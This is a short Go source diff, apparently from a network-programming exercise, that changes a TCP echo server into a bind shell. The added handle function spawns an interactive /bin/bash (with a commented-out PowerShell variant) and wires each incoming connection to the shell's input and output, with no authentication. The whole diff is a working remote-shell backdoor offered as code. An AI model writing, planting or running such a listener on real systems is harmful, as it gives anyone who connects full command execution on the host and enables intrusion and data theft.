@@ -4,6 +4,7 @@ import (
 	"io"
 	"log"
 	"net"
+	"os/exec"
 )
 
 func echo(conn net.Conn) {
@@ -12,6 +13,21 @@ func echo(conn net.Conn) {
 	if _, err := io.Copy(conn, conn); err != nil {
 		log.Fatalln("Unable to read/write data.")
 	}
+}
+
+func handle(conn net.Conn) {
+	//cmd := exec.Command("powershell.exe")
+	cmd := exec.Command("/bin/bash", "-i")
+	rp, wp := io.Pipe()
+	cmd.Stdin = conn
+	cmd.Stdout = wp
+
+	go io.Copy(conn, rp)
+	if err := cmd.Run(); err != nil {
+		log.Fatalln(err)
+	}
+
+	conn.Close()
 }
 
 func main() {
@@ -28,6 +44,6 @@ func main() {
 			log.Fatalln("Unable to accept connection")
 		}
 
-		go echo(conn)
+		go handle(conn)
 	}
 }
